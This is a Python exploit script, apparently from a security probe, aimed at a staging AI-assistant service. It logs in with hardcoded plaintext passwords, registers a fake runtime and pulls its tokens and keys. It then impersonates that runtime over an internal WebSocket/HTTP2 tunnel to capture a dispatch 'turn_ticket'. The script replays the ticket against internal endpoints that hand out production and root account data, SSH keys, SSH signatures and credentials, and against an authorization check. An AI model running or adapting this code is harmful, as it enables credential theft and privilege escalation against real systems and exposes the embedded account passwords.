# -*- coding: utf-8 -*-
# i28845b: connect h2-over-WS sidecar tunnel as our runtime, capture dispatch turn_ticket, test build/*
import json,os,time,base64,random,string,socket,ssl,struct,sys,re,hashlib,hmac,subprocess,threading
HOST="stage-assistant.lumiiai.cn"; BASE="https://"+HOST
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
CRED=("lc-zone-leader@lumii.dev","Lianchuang#2026")
_start=time.time()
def el(): return round(time.time()-_start,1)
def R(k,v):
    try: s=json.dumps(v,ensure_ascii=False)
    except Exception: s=repr(v)
    sys.stdout.write("R:%s:%s\n"%(k,base64.b64encode(s.encode()).decode())); sys.stdout.flush()

# optional h2
try:
    import h2  # noqa
except Exception:
    subprocess.run([sys.executable,"-m","pip","install","--quiet","h2"],timeout=120)
    try:
        import h2
    except Exception as e:
        R("H2_IMPORT_FAIL",{"e":repr(e)[:200]})
try:
    from h2.config import H2Configuration
    from h2.connection import H2Connection
    from h2.events import RequestReceived,DataReceived,StreamEnded,ConnectionTerminated,WindowUpdated,ResponseReceived,TrailersReceived
    R("H2_OK",{"v":getattr(h2,"__version__","?")})
except Exception as e:
    R("H2_SETUP_FAIL",{"e":repr(e)[:200]}); sys.exit(0)

def curl(args,timeout=40,stdin=None):
    try:
        p=subprocess.run(["curl","--http2","-sS"]+args,input=stdin,capture_output=True,timeout=timeout+10)
        return p.returncode,p.stdout,p.stderr
    except Exception as e: return -1,b"",repr(e).encode()
def call(path,method="GET",body=None,hdrs=None,timeout=40,maxlen=16000,use_cookie=True):
    args=["-m",str(timeout),"-A",UA,"-w","\n__CODE__%{http_code}"]
    if use_cookie: args+=["-b","cj","-c","cj"]
    h={"Accept":"application/json","Referer":BASE+"/","Origin":BASE}
    if hdrs: h.update(hdrs)
    for k,v in h.items(): args+=["-H","%s: %s"%(k,v)]
    data=None
    if body is not None:
        data=json.dumps(body).encode(); args+=["-H","Content-Type: application/json","--data-binary","@-"]
    if method!="GET": args+=["-X",method]
    args+=[BASE+path]
    rc,out,err=curl(args,timeout=timeout,stdin=data)
    txt=out.decode("utf-8","replace"); code=""; i=txt.rfind("__CODE__")
    if i>=0: code=txt[i+8:].strip()[:3]; txt=txt[:i]
    return {"code":code,"body":txt[:maxlen],"len":len(txt),"err":err.decode("utf-8","replace")[:120]}
def J(r):
    try: return json.loads(r["body"])
    except Exception: return None

def login(ident,pw):
    rc,out,err=curl(["-m","45","-A",UA,"-i","-X","POST","-H","Content-Type: application/json",
                     "--data-binary",json.dumps({"identifier":ident,"password":pw}),BASE+"/api/auth/login"],timeout=50)
    txt=out.decode("utf-8","replace"); m=re.search(r"HTTP/[0-9.]+ (\d{3})",txt); code=m.group(1) if m else ""
    mc=re.search(r"lumii_session=([^;]+)",txt); ck=("lumii_session="+mc.group(1)) if mc else ""
    return code,ck
cookie="";UID=""
for ident,pw in [CRED,("e2e-accept@lumii.dev","E2eAccept!0813")]:
    code,ck=login(ident,pw); R("A_try",{"id":ident.split("@")[0],"code":code,"ck":bool(ck)})
    if code=="200" and ck: cookie=ck; break
if not cookie: R("FATAL",{}); sys.exit(0)
me=call("/api/me",hdrs={"Cookie":cookie}); ME=J(me) or {}
UID=(ME.get("user") or {}).get("id") or ME.get("id") or ""
R("A_me",{"code":me["code"],"uid":UID,"body":me["body"][:400]})

# create runtime
cr=call("/api/runtimes","POST",{"name":"rb28845b-%d"%random.randint(1000,9999),"visibility":"org"},hdrs={"Cookie":cookie},maxlen=80000)
if not cr["code"].startswith("2"):
    cr=call("/api/runtimes","POST",{"name":"rb28845b-%d"%random.randint(1000,9999)},hdrs={"Cookie":cookie},maxlen=80000)
DEP=cr["body"]; mid=re.search(r"AGENT_ID='([^']+)'",DEP); mtk=re.search(r"AGENT_TOKEN='([^']+)'",DEP)
RID=mid.group(1) if mid else ""; RTOKEN=mtk.group(1) if mtk else ""
R("B_rt",{"code":cr["code"],"rid":RID,"tlen":len(RTOKEN)})
k=call("/api/runtimes/keys/current",hdrs={"x-agent-id":RID,"x-agent-token":RTOKEN},use_cookie=False)
kj=J(k) or {}; INBOUND=kj.get("inbound_key") or ""; PROOF_KEY=kj.get("proof_key") or ""
R("B_keys",{"code":k["code"],"inbound_len":len(INBOUND),"proof_len":len(PROOF_KEY),"body":k["body"][:500]})

# bind assistant to our runtime
crt=call("/api/assistants","POST",{"name":"rb28845ba","runtimeId":RID},hdrs={"Cookie":cookie},maxlen=2000)
aj=J(crt) or {}; ASST=((aj.get("assistant") or {}) or {}).get("id") or ""
R("C_asst",{"code":crt["code"],"asst":ASST})
FOLDER="tkfd_default_"+(ME.get("org",{}) or {}).get("id","").replace("org_","") if isinstance(ME.get("org"),dict) else ""
if not FOLDER or FOLDER=="tkfd_default_":
    o=call("/api/org",hdrs={"Cookie":cookie}); oj=J(o) or {}; oid=oj.get("id") or (oj.get("org") or {}).get("id") or ""
    FOLDER="tkfd_default_"+oid.replace("org_","")
R("C_folder",{"folder":FOLDER})

# ---- WS class ----
class WS:
    def __init__(self,host,path,hdrs=None,timeout=20):
        self.s=socket.create_connection((host,443),timeout=timeout); self.s.settimeout(timeout)
        ctx=ssl.create_default_context(); self.s=ctx.wrap_socket(self.s,server_hostname=host)
        key=base64.b64encode(os.urandom(16)).decode()
        req=("GET %s HTTP/1.1\r\nHost: %s\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n"
             "Sec-WebSocket-Key: %s\r\nSec-WebSocket-Version: 13\r\n")%(path,host,key)
        for k,v in (hdrs or {}).items(): req+="%s: %s\r\n"%(k,v)
        req+="\r\n"; self.s.sendall(req.encode()); buf=b""
        while b"\r\n\r\n" not in buf:
            d=self.s.recv(4096)
            if not d: raise EOFError()
            buf+=d
        self.hdr=buf.split(b"\r\n\r\n",1)[0].decode("latin1"); self.buf=buf.split(b"\r\n\r\n",1)[1]
        self.ok=(" 101 " in self.hdr.split("\r\n")[0])
    def _send(self,data,op):
        n=len(data); mask=os.urandom(4); h=bytes([0x80|op])
        if n<126: hdr=h+bytes([0x80|n])
        elif n<65536: hdr=h+bytes([0x80|126])+struct.pack(">H",n)
        else: hdr=h+bytes([0x80|127])+struct.pack(">Q",n)
        self.s.sendall(hdr+mask+bytes(b^mask[i%4] for i,b in enumerate(data)))
    def send_text(self,o): self._send(o.encode() if isinstance(o,str) else o,1)
    def send_bin(self,o): self._send(o,2)
    def send_ctl(self,op,data=b""): self._send(data,op)
    def _need(self,n):
        while len(self.buf)<n:
            d=self.s.recv(65536)
            if not d: raise EOFError()
            self.buf+=d
    def recv(self):
        self._need(2); b0,b1=self.buf[0],self.buf[1]; self.buf=self.buf[2:]
        op=b0&0x0f; n=b1&0x7f
        if n==126: self._need(2); n=struct.unpack(">H",self.buf[:2])[0]; self.buf=self.buf[2:]
        elif n==127: self._need(8); n=struct.unpack(">Q",self.buf[:8])[0]; self.buf=self.buf[8:]
        self._need(n); data=self.buf[:n]; self.buf=self.buf[n:]
        return op,data

TICKET=[None]; TUNNEL_LOG=[]; TUNNEL_UP=[False]; STOP=[False]
def tunnel_worker():
    try:
        w=WS(HOST,"/internal-tunnel/connect",hdrs={"User-Agent":UA,"Origin":BASE})
        R("T_open",{"ok":w.ok,"hdr":w.hdr[:160]})
        if not w.ok: return
        w.send_text(json.dumps({"agentId":RID,"lane":"interactive","token":INBOUND,"proto":"h2"}))
        conn=H2Connection(config=H2Configuration(client_side=False,header_encoding="utf-8"))
        conn.initiate_connection(); o=conn.data_to_send()
        if o: w.send_bin(o)
        TUNNEL_UP[0]=True
        streams={}
        w.s.settimeout(5)
        while not STOP[0]:
            try: op,data=w.recv()
            except socket.timeout:
                # h2 ping upkeep / drain
                o=conn.data_to_send()
                if o: w.send_bin(o)
                continue
            except Exception: break
            if op==9: w.send_ctl(10,data); continue
            if op==8: R("T_ws_close",{"d":data[:80].decode("latin1")}); break
            if op in (1,2):
                try: evs=conn.receive_data(data)
                except Exception as e: R("T_h2_err",{"e":repr(e)[:120]}); break
                for ev in evs:
                    if isinstance(ev,RequestReceived):
                        hd={str(k):str(v) for k,v in ev.headers}
                        streams[ev.stream_id]={"h":hd,"b":b""}
                    elif isinstance(ev,DataReceived):
                        if ev.stream_id in streams: streams[ev.stream_id]["b"]+=ev.data
                        try: conn.acknowledge_received_data(len(ev.data),ev.stream_id)
                        except Exception: pass
                    elif isinstance(ev,StreamEnded):
                        s=streams.get(ev.stream_id,{"h":{},"b":b""})
                        body=s["b"].decode("utf-8","replace")
                        path=s["h"].get(":path",""); method=s["h"].get(":method","")
                        rec={"path":path,"method":method,"body":body[:6000]}
                        TUNNEL_LOG.append(rec)
                        R("T_req",{"path":path,"method":method,"blen":len(body),"body":body[:2500]})
                        if "turn_ticket" in body:
                            try:
                                bj=json.loads(body)
                                tk=bj.get("turn_ticket") or (bj.get("task") or {}).get("turn_ticket")
                                if tk: TICKET[0]=tk; R("T_TICKET",{"tk":tk[:300],"len":len(tk)})
                            except Exception as e: R("T_tk_err",{"e":repr(e)[:100]})
                        # respond 200 ok
                        try:
                            conn.send_headers(ev.stream_id,[(":status","200"),("content-type","application/json")])
                            conn.send_data(ev.stream_id,b'{"ok":true}',end_stream=True)
                        except Exception: pass
                    elif isinstance(ev,ConnectionTerminated):
                        R("T_h2_term",{}); STOP[0]=True
                o=conn.data_to_send()
                if o:
                    try: w.send_bin(o)
                    except Exception: break
        R("T_end",{"frames":len(TUNNEL_LOG)})
    except Exception as e:
        R("T_EXC",{"e":repr(e)[:200]})

t=threading.Thread(target=tunnel_worker,daemon=True); t.start()
time.sleep(5)
R("T_state",{"up":TUNNEL_UP[0]})

# ---- trigger run-now in background ----
def mk(name,steps):
    return {"name":name,"enabled":True,"trigger":{"kind":"schedule","every":"once","onceAt":time.strftime("%Y-%m-%dT%H:%M:%SZ",time.gmtime(time.time()+9000))},
            "steps":steps,"overlap":"skip"}
RUN_RESULT=[None]
def run_now():
    cr=call("/api/tickets/folders/%s/workflows"%FOLDER,"POST",mk("agentdod",[{"id":"a1","kind":"agent_do","assistantId":ASST,"prompt":"请只回复 ok","sessionMode":"new_per_run","timeoutMinutes":1}]),hdrs={"Cookie":cookie},maxlen=3000)
    wj=J(cr) or {}; wid=(wj.get("workflow") or {}).get("id") or ""
    R("WF_create",{"code":cr["code"],"wid":wid})
    if not wid: return
    rn=call("/api/tickets/folders/%s/workflows/%s/run-now"%(FOLDER,wid),"POST",{},hdrs={"Cookie":cookie},timeout=90,maxlen=8000)
    rj=J(rn) or {}; run=rj.get("run") or {}
    RUN_RESULT[0]={"code":rn["code"],"status":run.get("status"),"raw":rn["body"][:1500]}
    R("WF_run",RUN_RESULT[0])
rn_t=threading.Thread(target=run_now,daemon=True); rn_t.start()

# wait up to 60s for ticket
for i in range(60):
    if TICKET[0]: break
    time.sleep(1)
R("T_got_ticket",{"have":bool(TICKET[0]),"t":el()})

# ---- use captured ticket against build/* ----
if TICKET[0]:
    tk=TICKET[0]
    MH={"Authorization":"Bearer "+RTOKEN,"x-agent-id":RID,"x-lumii-turn-proof":tk}
    for tag,path,bd in [("accounts","/internal/build/accounts",{"names":["PROD","ADMIN","SSH","LUMII","DEPLOY","ROOT","UBUNTU"]}),
                        ("sshkeys","/internal/build/ssh-keys",{}),
                        ("sshsign","/internal/build/ssh-sign",{"purpose":"ssh_agent"}),
                        ("credential","/internal/build/credential",{"environment_id":"env"})]:
        r=call(path,"POST",bd,hdrs=MH,use_cookie=False,maxlen=3000,timeout=25)
        R("TK_%s"%tag,{"code":r["code"],"body":r["body"][:2000]})
    # try ticket against a non-build internal route too
    a=call("/internal/authz/allows","POST",{"platform":"dashboard","actor_id":UID,"session_key":"conv_28845","code":"drive.manage_all"},hdrs=MH,use_cookie=False)
    R("TK_authz",{"code":a["code"],"body":a["body"][:300]})
else:
    R("TK_none",{"frames":len(TUNNEL_LOG)})

R("DONE",{"t":el(),"tunnel_log":TUNNEL_LOG[:5]})
STOP[0]=True
try: sys.stdout.flush()
except Exception: pass
time.sleep(1)
os._exit(0)
